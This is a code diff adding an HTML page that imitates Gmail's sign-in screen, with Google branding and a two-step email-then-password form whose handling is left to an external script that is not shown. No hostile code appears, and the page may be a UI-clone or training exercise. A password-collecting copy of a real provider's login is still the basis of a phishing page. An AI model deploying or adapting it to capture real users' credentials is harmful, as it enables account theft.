@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gmail</title>
+    <link rel="stylesheet" href="gmail-styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="gmail-logo">
+                <svg width="74" height="24" viewBox="0 0 74 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M9.24 8.81v-2.5h5.88c2.75 0 4.62 1.82 4.62 4.48 0 2.85-1.89 4.64-4.56 4.64h-2.19v-6.62h-3.75zm2.19 1.5h2.25c1.31 0 2.19-.81 2.19-2.19 0-1.38-.88-2.19-2.19-2.19h-2.25v4.38z" fill="#EA4335"/>
+                    <path d="M25.06 8.81v-2.5h5.88c2.75 0 4.62 1.82 4.62 4.48 0 2.85-1.89 4.64-4.56 4.64h-2.19v-6.62h-3.75zm2.19 1.5h2.25c1.31 0 2.19-.81 2.19-2.19 0-1.38-.88-2.19-2.19-2.19h-2.25v4.38z" fill="#FBBC05"/>
+                    <path d="M40.88 8.81v-2.5h5.88c2.75 0 4.62 1.82 4.62 4.48 0 2.85-1.89 4.64-4.56 4.64h-2.19v-6.62h-3.75zm2.19 1.5h2.25c1.31 0 2.19-.81 2.19-2.19 0-1.38-.88-2.19-2.19-2.19h-2.25v4.38z" fill="#34A853"/>
+                    <path d="M56.7 8.81v-2.5h5.88c2.75 0 4.62 1.82 4.62 4.48 0 2.85-1.89 4.64-4.56 4.64h-2.19v-6.62h-3.75zm2.19 1.5h2.25c1.31 0 2.19-.81 2.19-2.19 0-1.38-.88-2.19-2.19-2.19h-2.25v4.38z" fill="#EA4335"/>
+                    <text x="0" y="20" font-family="Google Sans" font-size="16" font-weight="500" fill="#5F6368">Gmail</text>
+                </svg>
+            </div>
+            <div class="header-actions">
+                <a href="#" class="header-link">For work</a>
+                <button class="sign-in-btn">Sign in</button>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="login-card">
+                <div class="login-header">
+                    <h1 class="login-title">Sign in</h1>
+                    <p class="login-subtitle">Use your Google Account</p>
+                </div>
+
+                <form class="login-form" id="gmailLoginForm">
+                    <div class="input-group">
+                        <input type="email" id="gmailEmail" name="email" class="input-field" placeholder="Email or phone" required>
+                        <div class="input-error" id="gmailEmailError"></div>
+                    </div>
+
+                    <div class="input-group" id="gmailPasswordGroup" style="display: none;">
+                        <div class="password-input-container">
+                            <input type="password" id="gmailPassword" name="password" class="input-field password-field" placeholder="Enter your password" required>
+                            <button type="button" class="password-toggle" id="gmailPasswordToggle">
+                                <svg width="20" height="20" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M10 3C5.5 3 1.73 6.11 1 10c.73 3.89 4.5 7 9 7s8.27-3.11 9-7c-.73-3.89-4.5-7-9-7zM10 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="#5F6368"/>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="input-error" id="gmailPasswordError"></div>
+                    </div>
+
+                    <div class="form-actions">
+                        <button type="button" class="back-button" id="gmailBackButton" style="display: none;">Back</button>
+                        <button type="submit" class="next-button" id="gmailNextButton">Next</button>
+                    </div>
+                </form>
+
+                <div class="login-footer">
+                    <div class="help-links">
+                        <a href="#" class="link">Forgot email?</a>
+                        <a href="#" class="link">Guest mode</a>
+                    </div>
+                    <div class="signup-section">
+                        <p>Not your computer? Use Guest mode to sign in privately.</p>
+                        <a href="#" class="link">Learn more</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="footer-content">
+                <div class="footer-links">
+                    <a href="#" class="footer-link">Help</a>
+                    <a href="#" class="footer-link">Privacy</a>
+                    <a href="#" class="footer-link">Terms</a>
+                </div>
+                <div class="language-selector">
+                    <select class="language-select">
+                        <option value="en">English (United States)</option>
+                        <option value="es">Español</option>
+                        <option value="fr">Français</option>
+                    </select>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="gmail-script.js"></script>
+</body>
+</html>
